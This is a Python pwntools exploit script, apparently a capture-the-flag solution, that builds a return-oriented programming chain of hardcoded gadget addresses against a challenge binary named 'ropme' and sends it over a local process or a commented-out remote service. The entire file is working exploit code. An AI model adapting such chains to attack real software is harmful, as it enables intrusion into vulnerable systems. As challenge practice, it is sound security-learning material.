#python2

from pwn import *

context.binary = './ropme'

io = process('./ropme') #remote("plzpwn.me", 6003)
#process('./ropme')
print(io.recvuntil('Gimme data: '))

vuln = p32(0x0804850A)
main = p32(0x08048539)

before_bye = p32(0x804858d)

pure_inc_ecx = p32(0x08048792)
pure_inc_edx = p32(0x08048505)
pure_inc_edx_alt = p32(0x080484fc)

pure_xor_edx = p32(0x080484ef)

pure_mov_ecx_to_eax = p32(0x080484f9)
pure_mov_edx_to_eax_and_ebx = p32(0x08048500)
pure_mov_esp_to_ebp = p32(0x080484ec)
pure_mov_edx_to_ebx = p32(0x08048502)

pure_x2_ecx = p32(0x080484ba)

pure_sub4_from_ecx = p32(0x080484f5)

pure_int80 = p32(0x080484f2)

# 0x080484df : push eax ; call edx
dirty_push1 = p32(0x080484df)

# 0x080484eb : push ebp ; mov ebp, esp ; ret
dirty_push2 = p32(0x080484eb)

# 0x08048534 : mov ecx, esp ; nop ; leave ; ret
dirty_killstack = p32(0x08048534)

pure_mov_valueatptr_esp_to_ebx = p32(0x0804841b) # or 0x0804841f / 0x0804841d. 1b is longest -> more legit

# 0x08048372 : push 0 ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
# idea: xor ebx
# Replacable: pure_xor_edx + pure_mov_edx_to_ebx
dirty1_xor = p32(0x08048372)


pay = "AAAA"*2 # padding
# ecx is pre set to ESP, now off setting it slightly to create some space
# (dangerous technique as we might find ourselves on the dangerous grounds but ok)

pay += pure_sub4_from_ecx*10

pay += pure_xor_edx #edx=0
pay += pure_inc_edx*3 #ebx=3
pay += pure_mov_edx_to_eax_and_ebx #eax=ebx=edx=3
pay += pure_inc_edx*(21+40) #edx=44
pay += pure_int80

pay += pure_xor_edx #edx=0
pay += pure_inc_edx*4 #edx=4
pay += pure_mov_edx_to_eax_and_ebx #eax=ebx=edx=4

pay += pure_xor_edx #edx=0
pay += pure_inc_edx*1 #edx=1
pay += pure_mov_edx_to_ebx #ebx=edx=1
pay += pure_inc_edx*43 #edx=64
pay += pure_int80
pay += main

print("pay: "+pay)
print("pay len: "+str(len(pay)))
print("=================sending pay===============")

io.sendline(pay)
io.interactive()



